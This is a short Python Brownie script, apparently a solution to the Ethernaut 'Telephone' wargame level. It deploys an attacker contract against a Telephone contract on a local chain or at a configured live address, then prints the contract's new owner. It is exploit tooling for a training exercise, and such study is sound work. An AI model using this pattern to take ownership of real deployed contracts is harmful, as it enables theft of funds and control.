from brownie import Attack, Telephone, Contract, network, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        telephone = Telephone.deploy({"from": get_account(index=1)})

        attack = Attack.deploy(telephone, {"from": account})

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                config["networks"][network.show_active()]["infura"]
            )
        )

        telephone = Contract.from_abi(
            Telephone._name,
            config["networks"][network.show_active()]["telephone"],
            Telephone.abi,
        )

        attack = Attack.deploy(telephone, {"from": account})

    attack.attack({"from": account}).wait(1)

    print(f"Telephone owner is {telephone.owner()}")


def main():
    attack()
